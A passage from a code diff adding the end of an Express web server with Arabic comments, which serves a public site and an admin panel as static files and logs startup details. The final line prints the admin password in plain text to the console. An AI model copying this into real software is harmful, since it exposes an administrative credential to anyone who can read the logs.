+    return res.status(500).json({ status: false, message: err.message });
+  }
+});
+
+// ==================== Static Files ====================
+// الموقع الأمامي (dist)
+app.use("/site", express.static(path.join(__dirname, "public/site")));
+// الـ assets يُطلب من /assets أيضاً (Vite builds use absolute paths)
+app.use("/assets", express.static(path.join(__dirname, "public/site/assets")));
+app.get("/site/*", (req, res) => {
+  res.sendFile(path.join(__dirname, "public/site/index.html"));
+});
+
+// لوحة التحكم
+app.use("/admin", express.static(path.join(__dirname, "public/admin")));
+app.get("/admin/*", (req, res) => {
+  res.sendFile(path.join(__dirname, "public/admin/index.html"));
+});
+
+// الصفحة الرئيسية تُعيد التوجيه للموقع
+app.get("/", (req, res) => {
+  res.redirect("/site");
+});
+
+// ==================== تشغيل الخادم ====================
+server.listen(PORT, () => {
+  console.log(`✅ Server running on http://localhost:${PORT}`);
+  console.log(`📊 Admin panel: http://localhost:${PORT}/admin`);
+  console.log(`🌐 Site: http://localhost:${PORT}/site`);
+  console.log(`🔑 Admin password: ${ADMIN_PASSWORD}`);
+});
